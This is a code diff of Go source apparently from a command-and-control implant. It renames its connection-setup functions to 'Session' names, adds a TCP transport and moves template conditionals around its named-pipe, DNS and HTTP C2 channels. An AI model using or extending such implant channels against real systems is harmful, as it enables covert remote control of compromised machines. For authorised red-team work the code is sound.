@@ -72,9 +72,9 @@ type Connection interface {
 	RemoveTunnel(ID uint64)
 }
 
-// StartConnection - Setup a connection either around a provided, physical connection,
+// StartSession - Setup a Session RPC either around a provided, physical connection,
 // or directly through C2 channel packages that take care of this.
-func (t *C2) StartConnection() (err error) {
+func (t *C2) StartSession() (err error) {
 
 	// Maybe move this out of here
 	cryptography.OTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
@@ -84,7 +84,7 @@ ConnLoop:
 		switch t.uri.Scheme {
 
 		// Some protocols can count on a physical connection already being here.
-		case "mtls", "wg":
+		case "mtls", "wg", "tcp":
 			if t.Conn == nil {
 				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
 			}
@@ -92,8 +92,8 @@ ConnLoop:
 			break ConnLoop
 
 		// Named pipes on Windows have additional Read & Write logic and error checks
+		// {{if .Config.NamePipec2Enabled}}
 		case "namedpipe":
-			// {{if .Config.NamePipec2Enabled}}
 			if t.Conn == nil {
 				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
 			}
@@ -101,8 +101,8 @@ ConnLoop:
 			// {{end}}
 			break ConnLoop
 
+		// {{if .Config.DNSc2Enabled}}
 		case "dns":
-			// {{if .Config.DNSc2Enabled}}
 			t.Connection, err = dnsclient.SetupConnectionDNS(t.uri, t.Profile)
 			if err != nil {
 				// {{if .Config.Debug}}
@@ -113,10 +113,11 @@ ConnLoop:
 			}
 			break ConnLoop
 			// {{end}}
+
+		// {{if .Config.HTTPc2Enabled}}
 		case "https":
 			fallthrough
 		case "http":
-			// {{if .Config.HTTPc2Enabled}}
 			t.Connection, err = httpclient.SetupConnectionHTTP(t.uri, t.Profile)
 			if err != nil {
 				// {{if .Config.Debug}}
@@ -148,10 +149,10 @@ ConnLoop:
 	return
 }
 
-// ServeConnectionHandlers - Watch for and process envelopes being sent by the server.
+// ServeSessionHandlers - Watch for and process envelopes being sent by the server.
 // These envelopes are quite similarly asynchronous to beacon tasks, but they
 // are NOT the same thing: this is somehow lower-level.
-func (t *C2) ServeConnectionHandlers() {
+func (t *C2) ServeSessionHandlers() {
 
 	connection := t.Connection
 
